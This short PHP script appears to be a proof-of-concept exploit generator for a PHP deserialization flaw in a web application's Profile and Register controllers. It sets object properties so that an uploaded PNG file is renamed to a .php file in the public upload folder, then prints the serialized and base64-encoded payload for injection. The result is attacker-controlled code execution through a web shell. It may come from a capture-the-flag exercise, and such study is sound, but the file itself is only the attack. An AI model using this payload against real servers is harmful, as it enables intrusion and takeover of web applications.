<?php
namespace app\web\controller;
class Profile{}
class Register{}
$a = new Profile();
$a->checker=false;
$a->index="upload_img";
$a->filename_tmp="../public/upload/upload/da5703ef349c8b4ca65880a05514ff89/359708b1e91239a49e7ac41f6ad655d4.png";
$a->filename="../public/upload/upload/da5703ef349c8b4ca65880a05514ff89/359708b1e91239a49e7ac41f6ad655d4.php";
$a->ext="png";
$b = new Register();
$b->checker=$a;
var_dump(serialize($b));
var_dump(base64_encode(serialize($b)));